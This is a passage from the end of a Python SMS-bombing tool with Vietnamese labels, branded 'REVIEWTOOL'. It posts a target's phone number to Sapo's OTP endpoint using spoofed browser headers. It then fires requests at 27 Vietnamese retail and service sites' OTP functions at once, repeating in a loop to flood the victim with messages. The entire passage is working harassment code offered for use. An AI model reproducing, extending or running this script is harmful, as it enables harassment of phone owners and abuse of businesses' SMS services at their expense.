        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    data = {
        'phonenumber': sdt,
    }
    response = requests.post('https://www.sapo.vn/fnb/sendotp', cookies=cookies, headers=headers, data=data).json()
    try:
        if response == True:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m SAPO SPAM THÀNH CÔNG')
        else:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m SAPO SPAM THẤT BẠI')
    except:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m SAPO SPAM THẤT BẠI')

# GỌI HÀM ĐỂ HOẠT ĐỘNG CODE !
# \\\ TOOL SPAM SMS 27 API ///
def run(sdt,i):                  
    threading.submit(reebok,sdt) #1
    threading.submit(glxplay,sdt) #2
    threading.submit(fahasa,sdt) #3
    threading.submit(nhathuoclongchau,sdt) #4
    threading.submit(fptshop,sdt) #5
    threading.submit(gumac,sdt) #6
    threading.submit(vietloan,sdt) #7
    threading.submit(viettel,sdt) #8
    threading.submit(best,sdt) #9
    threading.submit(emartmall,sdt) #10
    threading.submit(vinamilk,sdt) #11
    threading.submit(vietair,sdt) #12
    threading.submit(sapo,sdt) #13
    threading.submit(tokyolife,sdt) #14
    threading.submit(batdongsan,sdt) #15
    threading.submit(medicare,sdt) #16
    threading.submit(tv360,sdt) #17
    threading.submit(hoangphuc,sdt) #18
    threading.submit(fmplus,sdt) #19
    threading.submit(winmart,sdt) #20
    threading.submit(gateway,sdt) #21
    threading.submit(hine,sdt) #22
    threading.submit(futabus,sdt) #23
    threading.submit(thegioididong,sdt) #24
    threading.submit(kingfoodmart,sdt) #25
    threading.submit(lottemart,sdt) #26
    threading.submit(dienmayxanh,sdt) #27

for i in range(1,spam+1):
    run(sdt,i)